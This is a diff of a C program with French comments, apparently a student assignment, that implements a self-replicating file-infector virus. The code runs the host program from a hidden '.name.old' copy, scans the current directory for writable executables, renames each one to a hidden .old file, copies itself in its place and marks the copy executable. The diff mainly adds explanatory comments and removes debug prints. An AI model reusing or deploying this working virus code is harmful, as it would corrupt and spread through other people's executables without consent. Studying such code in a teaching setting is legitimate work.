@@ -20,6 +20,7 @@ int str_cut(char *str, int begin, int len)
     return len;
 }
 
+// permet de copier un fichier binaire vers un autre
 void copyFile(char *source, char *dest)
 {
     FILE *file_src, *file_dest;
@@ -62,32 +63,39 @@ int main(int agrc, char const *argv[])
     struct stat file_stat; // la structure qui contient les metadonnées du fichier courant
 
     // on cherche à exécuter le programme qui à été infecté par le virus
+    // on construit le nom du potentiel fichier qui à été infecté
     char *temp = (char *)argv[0];
     str_cut(temp, 0, 2);
-    printf("%s\n", (char *)temp);
 
     char *toExecute[strlen((char *)temp) + 6];
     sprintf((char *)toExecute, "./.%s.old", (char *)temp);
-    printf("%s\n", (char *)toExecute);
 
-    // on exécute le programme
+    // on exécute le programme (puisque le virus représente forcément un programme infecté, il y a forcément un programme qui s'exécute)
     system((char *)toExecute);
 
-    // une fois que le programme infecté a terminé de s'executer on lance notre virus
+    /****************************************************
+    ***  On recherche les potentiels fichiers cibles  ***
+    ****************************************************/
     // on ouvre le répertoire courant
     d = opendir(".");
 
+    // si on a réussi à ouvrir le répertoire
     if (d)
     {
+        // pour chacun des fichiers
         while ((dir = readdir(d)) != NULL)
         {
+            // on récupère le nom du fichier courant
             filename = dir->d_name;
+
+            // si on arrive pas à récupérer les métadonnées du fichier courant on quitte le programme
             if (stat(filename, &file_stat) < 0)
                 exit(EXIT_FAILURE);
 
+            // si on pointe bien sur un fichier (pas un dossier)
             if (S_ISREG(file_stat.st_mode))
             {
-                // on affiche les informations relatives au fichier courant (FIXME:)
+                // on affiche les informations relatives au fichier courant
                 printf("Information for %s\n", filename);
                 printf("---------------------------\n");
 
@@ -104,32 +112,32 @@ int main(int agrc, char const *argv[])
                 printf((file_stat.st_mode & S_IXOTH) ? "x" : "-");
                 printf("\n\n");
 
+                // avec notre mode de propagation de virus, les conditions suivantes permettent d'éviter la surinfection du virus lui-meme (cf rapport)
                 if ((file_stat.st_mode & S_IXUSR)                        // vérification que le fichier est bien exécutable par l'utilisateur
                     && (file_stat.st_mode & S_IWUSR)                     // vérification que le fichier possède bien les droits d'écriture
                     && strstr((char *)filename, (char *)".old") == NULL) // vérification que le fichier courant ne soit pas un des fichiers originaux infectés
                 {
 
-                    // avec notre mode de propagation de virus, les conditions précédentes permettent d'éviter la surinfection du virus lui-meme (cf rapport)
+                    printf("\t-> Found %s as potential target\n", filename);
 
-                    printf("\t->Found %s as potential target\n", filename);
-
-                    // afin de vérifier si le fichier n'est pas déjà infecté, on essaie d'ouvrir un potentiel fichier caché en .old
+                    // afin de vérifier si le fichier n'est pas déjà infecté, on essaie d'ouvrir un potentiel fichier caché en .old qui corresponderait au fichier actuel
                     // si on réussi à ouvrir le fichier alors le fichier cible est déjà infecté, sinon on l'infecte
                     FILE *potential_infected_file = NULL;
 
                     char *infectedFileName[strlen(filename) + 5];
                     sprintf((char *)infectedFileName, ".%s.old", (char *)filename);
-                    printf("\t->Searching for: %s...\n", (char *)infectedFileName);
+                    printf("\t-> Searching for: %s ...\n", (char *)infectedFileName);
 
                     if ((fopen((char *)infectedFileName, "r")) != NULL)
                     {
-                        printf("\t->File: %s has already been infected (%s)\n", (char *)filename, (char *)infectedFileName);
-                        printf("\t->%s will not be infected\n", (char *)filename);
+                        // on informe l'utilisateur que le fichier ne peut pas etre infecté car il l'a déjà été auparavant (utilisé uniquement pour le debug)
+                        printf("\t-> File: %s has already been infected (%s)\n", (char *)filename, (char *)infectedFileName);
+                        printf("\t-> %s will not be infected\n", (char *)filename);
                     }
                     else
                     {
                         // si on a pas réussi a ouvrir le fichier alors on l'infecte
-                        printf("\t->Infecting %s as %s\n", (char *)filename, (char *)infectedFileName);
+                        printf("\t-> Infecting %s as %s\n", (char *)filename, (char *)infectedFileName);
 
                         // on renome le fichier original
                         rename(filename, (char *)infectedFileName);
@@ -140,20 +148,23 @@ int main(int agrc, char const *argv[])
 
                         // la commande unix qui sera utilisée afin de rendre le nouveau virus executable
                         char *parmList[] = {"/bin/chmod", "+x", (char *)filename, NULL};
+                        // on rend le fichier exécutable
                         if ((PID = fork()) == 0)
                             execvp("chmod", parmList);
 
                         // on affiche un message qui confirme l'infection du fichier (utilisé uniquement pour le debug)
-                        printf("\t->file: %s as been infected as %s\n", (char *)filename, (char *)infectedFileName);
+                        printf("\t-> file: %s as been infected as %s\n", (char *)filename, (char *)infectedFileName);
                     }
                 }
+                // si le fichier ne remplit pas les conditions d'infection alors on affiche un message à l'utilisateur (utilisé uniquement pour le debug)
                 else
                 {
-                    printf("\t->%s is not a target\n", (char *)filename);
+                    printf("\t-> %s is not a target\n", (char *)filename);
                 }
                 printf("---------------------------\n\n");
             }
         }
+        // on ferme le pointeur du répertoire courant
         closedir(d);
     }
 
